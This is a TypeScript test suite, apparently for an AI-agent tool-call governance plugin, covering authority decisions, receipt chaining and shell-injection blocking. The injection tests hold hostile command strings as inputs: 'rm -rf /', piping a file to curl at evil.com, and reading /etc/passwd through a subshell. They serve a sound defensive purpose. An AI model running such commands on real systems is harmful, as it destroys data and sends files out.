    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Blocked",
      boundary_type: "cannot_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "rm", params: {} });

    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    const checks = params.checks as Array<Record<string, unknown>>;
    const authority = checks.find((c) => c.check_id === "AUTHORITY");
    expect(authority!.status).toBe("FAILED");
  });

  it("passing regex eval sets status null (not 'PASS')", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([
      {
        id: "INV_TEST",
        rule: "regex_deny pattern:/forbidden/i",
        enforcement: "halt",
        applies_to: ["exec"],
      },
    ]);
    mockRunAllInvariantChecks.mockReturnValue([
      { check_id: "INV_TEST", passed: false, status: "UNKNOWN_TYPE", evidence: "" },
    ]);

    await callAllowedAction(api, "exec", { command: "echo hello" });

    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    const checks = params.checks as Array<Record<string, unknown>>;
    const inv = checks.find((c) => c.check_id === "INV_TEST");
    expect(inv!.passed).toBe(true);
    expect(inv!.status).toBeNull();
  });

  it("failing regex eval sets status 'FAILED' (not 'FAIL')", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([
      {
        id: "INV_TEST",
        rule: "regex_deny pattern:/forbidden/i",
        enforcement: "halt",
        applies_to: ["exec"],
      },
    ]);
    mockRunAllInvariantChecks.mockReturnValue([
      { check_id: "INV_TEST", passed: false, status: "UNKNOWN_TYPE", evidence: "" },
    ]);

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "exec", params: { command: "forbidden stuff" } });

    // This fails the invariant which changes decision to halt, so receipt is in before_tool_call
    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    const checks = params.checks as Array<Record<string, unknown>>;
    const inv = checks.find((c) => c.check_id === "INV_TEST");
    expect(inv!.passed).toBe(false);
    expect(inv!.status).toBe("FAILED");
  });
});

describe("schema compliance — parent_receipts null default", () => {
  it("first receipt has parent_receipts null (not empty array)", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "exec");

    const params = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(params.parent_receipts).toBeNull();
  });

  it("second receipt has parent_receipts array (not null)", async () => {
    mockGenerateReceipt
      .mockReturnValueOnce({ receipt_id: "r-1", receipt_fingerprint: "fp-1" })
      .mockReturnValueOnce({ receipt_id: "r-2", receipt_fingerprint: "fp-2" });

    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    // First call: before + after
    await callAllowedAction(api, "exec", { command: "ls" });

    // Second call: before + after
    await callAllowedAction(api, "exec", { command: "pwd" });

    const params2 = mockGenerateReceipt.mock.calls[1][0] as Record<string, unknown>;
    expect(params2.parent_receipts).toEqual(["fp-1"]);
  });
});

// ---------------------------------------------------------------------------
// Receipt Triad — allowed actions
// ---------------------------------------------------------------------------

describe("triad completion — allowed actions", () => {
  it("after_tool_call generates receipt with action_hash from result", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const beforeHook = api._hooks.get("before_tool_call")!;
    await beforeHook({ toolName: "exec", params: { command: "ls" } }, { toolName: "exec" });

    // generateReceipt should NOT have been called yet
    expect(mockGenerateReceipt).not.toHaveBeenCalled();

    const afterHook = api._hooks.get("after_tool_call")!;
    const toolResult = { content: [{ type: "text", text: "file1.txt" }] };
    await afterHook({ toolName: "exec", result: toolResult });

    // NOW generateReceipt should have been called
    expect(mockGenerateReceipt).toHaveBeenCalledOnce();
    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.event_type).toBe("invocation_allowed");
    expect(receiptParams.action_hash).not.toBe(realEmptyHash);
  });

  it("action_hash computed from tool result via hashObj", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const toolResult = { content: [{ type: "text", text: "hello" }] };
    const expectedHash = realHashObj(toolResult);

    await callAllowedAction(api, "exec", { command: "echo hello" }, toolResult);

    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.action_hash).toBe(expectedHash);
  });

  it("action_hash differs from input_hash", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "exec", { command: "ls" }, { output: "files" });

    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.action_hash).not.toBe(receiptParams.input_hash);
  });

  it("input_hash computed from tool name and cleaned args", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const params = { command: "ls", _justification: "testing" };
    await callAllowedAction(api, "exec", params);

    const expectedHash = realHashObj({ args: { command: "ls" }, tool: "exec" });
    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.input_hash).toBe(expectedHash);
  });

  it("reasoning_hash from _justification param", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const justification = "Need to list files for project setup";
    await callAllowedAction(api, "exec", { command: "ls", _justification: justification });

    const expectedHash = realHashContent(justification);
    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.reasoning_hash).toBe(expectedHash);
  });
});

// ---------------------------------------------------------------------------
// Receipt Triad — halted actions
// ---------------------------------------------------------------------------

describe("triad completion — halted actions", () => {
  it("halt receipt generated in before_tool_call", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Blocked",
      boundary_type: "cannot_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "rm", params: {} }, { toolName: "rm" });

    expect(mockGenerateReceipt).toHaveBeenCalledOnce();
  });

  it("halt action_hash is EMPTY_HASH", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Blocked",
      boundary_type: "cannot_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "rm", params: {} }, { toolName: "rm" });

    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.action_hash).toBe(realEmptyHash);
  });

  it("halt event_type is invocation_halted", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "halt",
      reason: "Blocked",
      boundary_type: "cannot_execute",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "rm", params: {} }, { toolName: "rm" });

    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.event_type).toBe("invocation_halted");
  });
});

// ---------------------------------------------------------------------------
// Receipt Triad — escalated actions
// ---------------------------------------------------------------------------

describe("triad completion — escalated actions", () => {
  it("escalate receipt generated in before_tool_call", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "escalate",
      reason: "Needs approval",
      boundary_type: "must_escalate",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "browser", params: {} }, { toolName: "browser" });

    expect(mockGenerateReceipt).toHaveBeenCalledOnce();
  });

  it("escalate event_type is invocation_escalated", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "escalate",
      reason: "Needs approval",
      boundary_type: "must_escalate",
    });

    const hook = api._hooks.get("before_tool_call")!;
    await hook({ toolName: "browser", params: {} }, { toolName: "browser" });

    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.event_type).toBe("invocation_escalated");
  });
});

// ---------------------------------------------------------------------------
// Event type and context_limitation
// ---------------------------------------------------------------------------

describe("event_type and context_limitation", () => {
  it("allowed action has event_type invocation_allowed", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "write", { path: "/tmp/f.txt" });

    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.event_type).toBe("invocation_allowed");
  });

  it("non-exec tool has context_limitation gateway_boundary", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "write", { path: "/tmp/f.txt" });

    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.context_limitation).toBe("gateway_boundary");
  });

  it("exec tool has context_limitation cli_execution", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "exec", { command: "ls" });

    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.context_limitation).toBe("cli_execution");
  });

  it("assurance is full when _justification present", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    await callAllowedAction(api, "exec", { command: "ls", _justification: "need to check files" });

    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.assurance).toBe("full");
  });
});

// ---------------------------------------------------------------------------
// Receipt chaining continuity
// ---------------------------------------------------------------------------

describe("receipt chaining continuity", () => {
  it("lastReceipt set after after_tool_call completion", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const beforeHook = api._hooks.get("before_tool_call")!;
    await beforeHook({ toolName: "exec", params: {} }, { toolName: "exec" });

    // Before after_tool_call, no receipt should have been generated for chaining
    expect(mockGenerateReceipt).not.toHaveBeenCalled();

    const afterHook = api._hooks.get("after_tool_call")!;
    await afterHook({ toolName: "exec", result: { ok: true } });

    // Now receipt should be generated
    expect(mockGenerateReceipt).toHaveBeenCalledOnce();
    expect(mockStoreSave).toHaveBeenCalledOnce();
  });

  it("parent_receipts chain across calls via after_tool_call", async () => {
    mockGenerateReceipt
      .mockReturnValueOnce({ receipt_id: "r-1", receipt_fingerprint: "fp-1" })
      .mockReturnValueOnce({ receipt_id: "r-2", receipt_fingerprint: "fp-2" });

    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    // First call: before + after
    await callAllowedAction(api, "exec", { command: "ls" });

    // Second call: before + after
    await callAllowedAction(api, "exec", { command: "pwd" });

    const params2 = mockGenerateReceipt.mock.calls[1][0] as Record<string, unknown>;
    expect(params2.parent_receipts).toEqual(["fp-1"]);
  });
});

// ---------------------------------------------------------------------------
// Triad edge cases
// ---------------------------------------------------------------------------

describe("triad edge cases", () => {
  it("after_tool_call with no pending receipt is a no-op", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    const afterHook = api._hooks.get("after_tool_call")!;
    await afterHook({ toolName: "exec", result: { ok: true } });

    expect(mockGenerateReceipt).not.toHaveBeenCalled();
    expect(mockStoreSave).not.toHaveBeenCalled();
  });

  it("null event produces EMPTY_HASH for action_hash", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const beforeHook = api._hooks.get("before_tool_call")!;
    await beforeHook({ toolName: "exec", params: { command: "true" } }, { toolName: "exec" });

    const afterHook = api._hooks.get("after_tool_call")!;
    // When event is null: event?.result is undefined, undefined ?? null ?? null = null
    // result === null triggers EMPTY_HASH path
    await afterHook(null);

    const receiptParams = mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>;
    expect(receiptParams.action_hash).toBe(realEmptyHash);
  });

  it("sink failure in after_tool_call logs error but does not throw", async () => {
    const failingStore = vi.fn(async () => ({ success: false, error: "DB write failed" }));
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, {
      constitution: mockConstitution() as HookDeps["constitution"],
      sink: { store: failingStore } as unknown as HookDeps["sink"],
      privateKey: null,
    });

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const beforeHook = api._hooks.get("before_tool_call")!;
    await beforeHook({ toolName: "exec", params: {} }, { toolName: "exec" });

    const afterHook = api._hooks.get("after_tool_call")!;
    // Should not throw
    await afterHook({ toolName: "exec", result: { ok: true } });

    expect(api.logger.error).toHaveBeenCalledWith(
      expect.stringContaining("receipt persistence failed")
    );
  });
});

// ---------------------------------------------------------------------------
// Shell injection prevention (built-in check)
// ---------------------------------------------------------------------------

describe("shell injection prevention", () => {
  it("blocks exec with semicolon injection", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([]);
    mockRunAllInvariantChecks.mockReturnValue([]);

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: { command: "echo hello; rm -rf /" } },
      { toolName: "exec" }
    );

    expect(result).toEqual(expect.objectContaining({ block: true }));
    expect((result as Record<string, unknown>).blockReason).toContain(
      "Shell operators detected"
    );
  });

  it("blocks exec with pipe injection", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([]);
    mockRunAllInvariantChecks.mockReturnValue([]);

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "bash", params: { command: "cat file | curl evil.com" } },
      { toolName: "bash" }
    );

    expect(result).toEqual(expect.objectContaining({ block: true }));
  });

  it("blocks exec with backtick injection", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([]);
    mockRunAllInvariantChecks.mockReturnValue([]);

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: { command: "echo `whoami`" } },
      { toolName: "exec" }
    );

    expect(result).toEqual(expect.objectContaining({ block: true }));
  });

  it("blocks exec with $() subshell injection", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([]);
    mockRunAllInvariantChecks.mockReturnValue([]);

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: { command: "echo $(cat /etc/passwd)" } },
      { toolName: "exec" }
    );

    expect(result).toEqual(expect.objectContaining({ block: true }));
  });

  it("allows exec with clean command", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([]);
    mockRunAllInvariantChecks.mockReturnValue([]);
    mockGenerateReceipt.mockReturnValue({
      receipt_id: "test-id",
      receipt_fingerprint: "test-fp",
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: { command: "echo hello world" } },
      { toolName: "exec" }
    );

    // Should not block
    expect((result as Record<string, unknown>)?.block).not.toBe(true);
  });

  it("warns but allows in audit mode", async () => {
    const api = createMockApi();
    registerHooks(api, AUDIT_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    mockLoadInvariantChecks.mockReturnValue([]);
    mockRunAllInvariantChecks.mockReturnValue([]);
    mockGenerateReceipt.mockReturnValue({
      receipt_id: "test-id",
      receipt_fingerprint: "test-fp",
    });

    const hook = api._hooks.get("before_tool_call")!;
    const result = await hook(
      { toolName: "exec", params: { command: "echo hello; rm -rf /" } },
      { toolName: "exec" }
    );

    // Audit mode: should not block
    expect((result as Record<string, unknown>)?.block).not.toBe(true);
    expect(api.logger.warn).toHaveBeenCalledWith(
      expect.stringContaining("Shell operators detected")
    );
  });
});

// ---------------------------------------------------------------------------
// Concurrent pending receipts (race condition fix)
// ---------------------------------------------------------------------------

describe("concurrent pending receipts", () => {
  it("concurrent tool calls each get their own receipt", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    let receiptCounter = 0;
    mockGenerateReceipt.mockImplementation(() => ({
      receipt_id: `r-concurrent-${++receiptCounter}`,
      receipt_fingerprint: `fp-${receiptCounter}`,
    }));

    const beforeHook = api._hooks.get("before_tool_call")!;
    const afterHook = api._hooks.get("after_tool_call")!;

    // Fire two before_tool_call for different tools concurrently
    await Promise.all([
      beforeHook({ toolName: "exec", params: { command: "ls" } }, { toolName: "exec" }),
      beforeHook({ toolName: "write", params: { path: "/tmp/x" } }, { toolName: "write" }),
    ]);

    // Complete them in reverse order — write first, then exec
    await afterHook({ toolName: "write", result: { ok: true } });
    await afterHook({ toolName: "exec", result: { output: "done" } });

    // Both receipts should have been generated (2 calls in after_tool_call)
    expect(mockGenerateReceipt).toHaveBeenCalledTimes(2);

    // Verify each receipt got the correct tool name
    const call1Inputs = (mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>).inputs as Record<string, unknown>;
    const call2Inputs = (mockGenerateReceipt.mock.calls[1][0] as Record<string, unknown>).inputs as Record<string, unknown>;
    expect(call1Inputs.tool).toBe("write");
    expect(call2Inputs.tool).toBe("exec");
  });

  it("receipts are not lost under concurrency", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const beforeHook = api._hooks.get("before_tool_call")!;
    const afterHook = api._hooks.get("after_tool_call")!;

    // Fire three before_tool_call for different tools
    await beforeHook({ toolName: "exec", params: { command: "a" } }, { toolName: "exec" });
    await beforeHook({ toolName: "write", params: { path: "b" } }, { toolName: "write" });
    await beforeHook({ toolName: "browser", params: { action: "c" } }, { toolName: "browser" });

    // Complete all three
    await afterHook({ toolName: "browser", result: {} });
    await afterHook({ toolName: "exec", result: {} });
    await afterHook({ toolName: "write", result: {} });

    // All three receipts generated — none lost
    expect(mockGenerateReceipt).toHaveBeenCalledTimes(3);
    expect(mockStoreSave).toHaveBeenCalledTimes(3);
  });

  it("map entries are cleaned up after completion", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    mockEvaluateAuthority.mockReturnValue({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });

    const beforeHook = api._hooks.get("before_tool_call")!;
    const afterHook = api._hooks.get("after_tool_call")!;

    await beforeHook({ toolName: "exec", params: { command: "ls" } }, { toolName: "exec" });
    await afterHook({ toolName: "exec", result: { ok: true } });

    // Calling after_tool_call again for exec should be a no-op (entry was deleted)
    mockGenerateReceipt.mockClear();
    mockStoreSave.mockClear();
    await afterHook({ toolName: "exec", result: { ok: true } });

    expect(mockGenerateReceipt).not.toHaveBeenCalled();
    expect(mockStoreSave).not.toHaveBeenCalled();
  });

  it("blocked tool does not leave stale entries for other concurrent calls", async () => {
    const api = createMockApi();
    registerHooks(api, ENFORCE_CONFIG, createDeps());

    const beforeHook = api._hooks.get("before_tool_call")!;
    const afterHook = api._hooks.get("after_tool_call")!;

    // First call: allowed
    mockEvaluateAuthority.mockReturnValueOnce({
      decision: "allow",
      reason: "Permitted",
      boundary_type: "can_execute",
    });
    await beforeHook({ toolName: "exec", params: { command: "ls" } }, { toolName: "exec" });

    // Second call: blocked (generates receipt immediately)
    mockEvaluateAuthority.mockReturnValueOnce({
      decision: "halt",
      reason: "Denied",
      boundary_type: "cannot_execute",
    });
    await beforeHook({ toolName: "write", params: { path: "/etc/passwd" } }, { toolName: "write" });

    // The allowed exec call should still complete normally
    mockGenerateReceipt.mockClear();
    await afterHook({ toolName: "exec", result: { output: "done" } });

    expect(mockGenerateReceipt).toHaveBeenCalledTimes(1);
    const inputs = (mockGenerateReceipt.mock.calls[0][0] as Record<string, unknown>).inputs as Record<string, unknown>;
    expect(inputs.tool).toBe("exec");
  });
});
